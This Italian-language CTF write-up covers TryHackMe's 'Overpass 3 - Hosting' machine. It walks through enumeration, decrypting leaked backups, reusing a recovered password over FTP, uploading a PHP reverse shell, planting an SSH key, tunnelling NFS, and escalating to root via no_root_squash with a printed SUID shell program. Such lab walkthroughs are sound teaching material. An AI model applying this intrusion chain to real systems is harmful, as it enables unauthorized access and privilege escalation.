---
title: "Overpass 3 - Hosting"
description: "CTF Writeup per Overpass 3 - Hosting (TryHackMe)"
---

# Overpass 3 -  Hosting

https://tryhackme.com/room/overpass3hosting

Come prima cosa, e come il solito, procediamo a enumerare i servizi attivi nella macchina con `nmap`:

```bash
kali@kali:~/Desktop/CTF/Overpass3$ sudo nmap -sS -sV -sC -O -p- 10.129.169.168  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-25 09:56 +0100
Nmap scan report for 10.129.169.168
Host is up (0.040s latency).
Not shown: 65318 filtered tcp ports (no-response), 214 filtered tcp ports (admin-prohibited)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
|_http-title: Overpass Hosting
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 5.14 - 6.8 (91%), Linux 4.15 (90%), Linux 3.10 - 3.13 (88%), Crestron XPanel control system (86%), Linux 3.8 - 3.16 (86%), Amazon Linux AMI 2018.03 (Linux 4.14) (85%), Android 10 - 12 (Linux 4.14 - 4.19) (85%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 225.97 seconds
                                                                   
```

Sono presenti - servizi

| Servizio | Porta | Versione |
| --- | --- | --- |
| ftp | 21 | vsftpd 3.0.3 |
| ssh | 22 | OpenSSH 8.0 (protocol 2.0) |
| http | 80 | Apache httpd 2.4.37 (Centos) |

Il login come utente `anonymous` è disabilitato su `ftp` 

Eseguiamo allora con `gobuster` la *Discovery Endpoint* per trovare pagine web nascoste.

```bash
kali@kali:~/Desktop/CTF/Overpass3$ gobuster dir -u http://10.129.169.168/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.bak,.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.169.168/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,bak,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.php             (Status: 403) [Size: 217]
.hta                 (Status: 403) [Size: 213]
.htaccess.php        (Status: 403) [Size: 222]
.hta.txt             (Status: 403) [Size: 217]
.hta.bak             (Status: 403) [Size: 217]
.htpasswd            (Status: 403) [Size: 218]
.htaccess.bak        (Status: 403) [Size: 222]
.htaccess            (Status: 403) [Size: 218]
.htaccess.txt        (Status: 403) [Size: 222]
.htpasswd.txt        (Status: 403) [Size: 222]
.htpasswd.bak        (Status: 403) [Size: 222]
.htpasswd.php        (Status: 403) [Size: 222]
backups              (Status: 301) [Size: 238] [--> http://10.129.169.168/backups/]
cgi-bin/             (Status: 403) [Size: 217]
index.html           (Status: 200) [Size: 1770]
Progress: 19000 / 19000 (100.00%)
===============================================================
Finished
===============================================================
                                                                                                       
kali@kali:~/Desktop/CTF/Overpass3$ 

```

C’è la cartella `/backups` che se aperta contiene un file `backup.zip` , che una volta aperto contiene un file cifrato `CustomerDetails.xlsx.gpg` e una chiave `priv.key` 

```bash
kali@kali:~/Desktop/CTF/Overpass3$ file priv.key             
priv.key: PGP private key block
                                                                                                       
kali@kali:~/Desktop/CTF/Overpass3$ gpg --show-keys priv.key 
gpg: keybox '/home/kali/.gnupg/pubring.kbx' created
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
sec#  rsa2048 2020-11-08 [SC] [expired: 2022-11-08]
      49829BBEB100BB2692F33CD2C9AE71AB3180BC08
uid                      Paradox <paradox@overpass.thm>
ssb#  rsa2048 2020-11-08 [E] [expired: 2022-11-08]

gpg: WARNING: No valid encryption subkey left over.
```

Proviamo ad importarla e a decryptare il file

```bash
kali@kali:~/Desktop/CTF/Overpass3$ gpg --import priv.key   
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
                                                                                                       
kali@kali:~/Desktop/CTF/Overpass3$ gpg --list-secret-keys 
/home/kali/.gnupg/pubring.kbx
-----------------------------
sec   rsa2048 2020-11-08 [SC] [expired: 2022-11-08]
      49829BBEB100BB2692F33CD2C9AE71AB3180BC08
uid           [ expired] Paradox <paradox@overpass.thm>

                                                                                                       
kali@kali:~/Desktop/CTF/Overpass3$ gpg --output CustomerDetails.xlsx --decrypt CustomerDetails.xlsx.gpg
gpg: encrypted with rsa2048 key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
gpg: Note: secret key 9E86A1C63FB96335 expired at Tue 08 Nov 2022 10:14:31 PM CET
                                                                                                       
kali@kali:~/Desktop/CTF/Overpass3$ 
```

Otteniamo quindi un nuovo file `CustomerDetails.xlsx` che una volta aperto

![image.png](assets/overpass-3-hosting/image.png)

E guardando la pagina `index.html` possiamo vedere i ruoli di ciascuno

![image.png](assets/overpass-3-hosting/image-1.png)

Consocendo `paradox:ShibesAreGreat123` possiamo loggarci in ftp e quindi scaricare tutto il contenuto!

```bash
wget -m ftp://paradox:ShibesAreGreat123@10.10.10.98
```

E ottenendo quindi

```bash
kali@kali:~/Desktop/CTF/Overpass3$ cd 10.129.169.168 
                                                                                                       
kali@kali:~/Desktop/CTF/Overpass3/10.129.169.168$ ls
backups  hallway.jpg  index.html  main.css  overpass.svg
```

nulla di interessante 😕

Ma questi file sono tutti quelli accessibili dalla webapp! possiamo provare a caricare uno script `PHP` e vedere cosa succede

```bash
kali@kali:~/Desktop/CTF/Overpass3$ cat test.php      
<?php echo 'ciao' ?>
                                                                                                       
kali@kali:~/Desktop/CTF/Overpass3$ ftp 10.129.169.168
Connected to 10.129.169.168.
220 (vsFTPd 3.0.3)
Name (10.129.169.168:kali): paradox
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put test.php 
local: test.php remote: test.php
229 Entering Extended Passive Mode (|||53054|)
150 Ok to send data.
100% |**********************************************************|    21      105.16 KiB/s    00:00 ETA
226 Transfer complete.
21 bytes sent in 00:00 (0.25 KiB/s)
ftp> 

```

Confermato con successo possiamo caricare file!!! creiamo quindi una reverse shell creata con https://www.revshells.com/ usando `PHP PentestMonkey` 

Aprendo `kali@kali:~/Desktop/CTF/Overpass3$ curl http://10.129.169.168/shell.php`

otteniamo la shell!

![image.png](assets/overpass-3-hosting/image-2.png)

Entrando così con utente `apache`

Si tratta di un sistema `Linux` in particolare `CentOS 8` 

Andando nella home directory dell’utente `/usr/share/httpd` vediamo la prima flag

```bash
bash-4.4$ cd ~
bash-4.4$ pwd
/usr/share/httpd
bash-4.4$ ls -al
total 24
drwxr-xr-x.  5 root root   63 Nov 17  2020 .
drwxr-xr-x. 81 root root 4096 Nov  8  2020 ..
drwxr-xr-x.  3 root root 4096 Nov  8  2020 error
drwxr-xr-x.  3 root root 8192 Nov  8  2020 icons
drwxr-xr-x.  3 root root  140 Nov  8  2020 noindex
-rw-r--r--.  1 root root   38 Nov 17  2020 web.flag
bash-4.4$ cat web.flag 
thm{***************************}
bash-4.4$ 
```

E’ presente inoltre un elemento critico in `NFS` 

```bash
bash-4.4$ cat /etc/exports
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

`no_root_squash` è una opzione vulnerabile, perchè permette a chiunque di creare un eseguibile che sarà di proprietà di `root` con `bit SUID` attivo.

Ma

```bash
kali@kali:~/Desktop/CTF/Overpass3$ showmount -e 10.128.188.45
clnt_create: RPC: Unable to receive
```

Sembra chiuso lato firewall infatti anche `nmap` le porte 111 e 2049 le segnala come filtered

> 
> 
> 
> 111/tcp  filtered rpcbind
> 2049/tcp filtered nfs
> 

Ma provando a loggarci con le credenziali trovate prima di `paradox` effettivamente funziona!

```bash
bash-4.4$ su - paradox
Password: 
Last login: Wed Nov 18 18:33:57 GMT 2020 from 192.168.170.145 on pts/0
[paradox@ip-10-128-188-45 ~]$ 
```

Prima non funzionava perchè l’accesso a `ssh` richiedeva perforza la chiave.

Ora che siamo `paradox` riusciamo a lanciare il comando `showmount` localmente e otteniamo

```bash
[paradox@ip-10-128-188-45 home]$ showmount -e 10.128.188.45
Export list for 10.128.188.45:
/home/james *
[paradox@ip-10-128-188-45 home]$ 
```

Quindi dobbiamo ottenere l’accesso a `james` e creare i file lì!

in `/home/paradox/.ssh` è presente `authorized_keys` ed è modificabile. possiamo aggiungere una nostra chiave privata per effettuare il login `ssh` diretto. Creiamo la chiave con 
`ssh-keygen -t ed25519 -f ~/.ssh/overpass3` e aggiungiamo la chiave pubblica in `authorized_keys`

```bash
kali@kali:~/Desktop/CTF/Overpass3$ ssh -i overpass3.key paradox@10.128.188.45
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Sun Oct 25 15:01:59 2026
[paradox@ip-10-128-188-45 ~]$ ls
backup.zip  CustomerDetails.xlsx  CustomerDetails.xlsx.gpg  priv.key
[paradox@ip-10-128-188-45 ~]$ whoami
paradox
[paradox@ip-10-128-188-45 ~]$ 

```

Se ora noi facciamo un tunnel SSH facendo uscire le due porte di `NFS` (`111,2049,20048`) possiamo montare la nostra cartella direttamente da Kali

```bash
kali@kali:~/Desktop/CTF/Overpass3$ ssh -N -L 111:127.0.0.1:111 -L 2049:127.0.0.1:2049 -L 20048:127.0.0.1:20048 -i overpass3.key paradox@10.128.188.45
```

```bash
kali@kali:~/Desktop/CTF/Overpass3$ showmount -e 127.0.0.1                              
Export list for 127.0.0.1:
/home/james *
```

```bash
kali@kali:~/Desktop/CTF/Overpass3$ sudo mount -t nfs -o vers=3,nolock 127.0.0.1:/home/james /tmp/mnt_temp 

```

Andando ora su `/tmp/mnt_temp` vediamo `user.flag` 

```bash
kali@kali:/tmp/mnt_temp$ ls
user.flag
                                                                                                         
kali@kali:/tmp/mnt_temp$ cat user.flag  
thm{**********************}
```

Ora sfruttiamo lo stesso ragionamento per creare un eseguibile in `NFS` che grazie al flag `no_root_squash` ci permette di creare un esegubile con proprietario `root` e `bit SUID`.

```bash
kali@kali:/tmp/mnt_temp$ cat root.c                         
#include <unistd.h>   // Per setgid() e setuid()
#include <stdlib.h>   // Per system()

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}

kali@kali:/tmp/mnt_temp$ sudo chown 0:0 /tmp/mnt_temp/root
kali@kali:/tmp/mnt_temp$ chmod +s root                                                                                                       
kali@kali:/tmp/mnt_temp$ ls -l root                 
-rwsrwsr-x 1 kali kali 779728 Oct 25 16:30 root
```

Ora da `james` eseguendo il file `/home/james/root`dovremmo riuscire a diventare root!

Nella cartella montata ci sono anche la `private key` ssh di `james` 

```bash
kali@kali:/tmp/mnt_temp$ ls -al
total 784
drwx------  3 kali kali    138 Oct 25 16:30 .
drwxrwxrwt 14 root root    380 Oct 25 16:41 ..
lrwxrwxrwx  1 root root      9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--  1 kali kali     18 Nov  8  2019 .bash_logout
-rw-r--r--  1 kali kali    141 Nov  8  2019 .bash_profile
-rw-r--r--  1 kali kali    312 Nov  8  2019 .bashrc
-rwsrwsr-x  1 kali kali 779728 Oct 25 16:30 root
-rw-rw-r--  1 kali kali    172 Oct 25 16:30 root.c
drwx------  2 kali kali     61 Nov  8  2020 .ssh
-rw-------  1 kali kali     38 Nov 17  2020 user.flag
                                                                                                         
kali@kali:/tmp/mnt_temp$ cd .ssh           
                                                                                                         
kali@kali:/tmp/mnt_temp/.ssh$ ls    
authorized_keys  id_rsa  id_rsa.pub
                                                                                                         
kali@kali:/tmp/mnt_temp/.ssh$ cat id_rsa  
```

```bash

kali@kali:~/Desktop/CTF/Overpass3$ chmod 600 james.key 
                                                                                          
kali@kali:~/Desktop/CTF/Overpass3$ ssh -i james.key james@10.128.188.45
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
[james@ip-10-128-188-45 ~]$ ls
root  root.c  user.flag
[james@ip-10-128-188-45 ~]$ ls -al
total 784
drwx------. 3 james james    138 Oct 25 15:30 .
drwxr-xr-x. 4 root  root      34 Nov  8  2020 ..
lrwxrwxrwx. 1 root  root       9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--. 1 james james     18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 james james    141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 james james    312 Nov  8  2019 .bashrc
-rwsrwxr-x  1 root  root  779728 Oct 25 15:30 root
-rw-rw-r--  1 james james    172 Oct 25 15:30 root.c
drwx------. 2 james james     61 Nov  8  2020 .ssh
-rw-------. 1 james james     38 Nov 17  2020 user.flag
[james@ip-10-128-188-45 ~]$ ./root 
[root@ip-10-128-188-45 ~]# whoami
root

```

Ora possiamo ottenere l’ultima flag

```bash
[root@ip-10-128-188-45 ~]# cd /root/
[root@ip-10-128-188-45 root]# ls -al
total 24
dr-x------.  3 root root 141 Nov 17  2020 .
drwxr-xr-x. 17 root root 244 Nov 18  2020 ..
lrwxrwxrwx.  1 root root   9 Nov  8  2020 .bash_history -> /dev/null
-rw-------.  1 root root  18 May 11  2019 .bash_logout
-rw-------.  1 root root 176 May 11  2019 .bash_profile
-rw-------.  1 root root 176 May 11  2019 .bashrc
-rw-------.  1 root root 100 May 11  2019 .cshrc
-rw-------.  1 root root  38 Nov 17  2020 root.flag
drwxr-xr-x   2 root root  29 Nov 17  2020 .ssh
-rw-------.  1 root root 129 May 11  2019 .tcshrc
[root@ip-10-128-188-45 root]# cat root.flag 
thm{********************************}
[root@ip-10-128-188-45 root]# 
```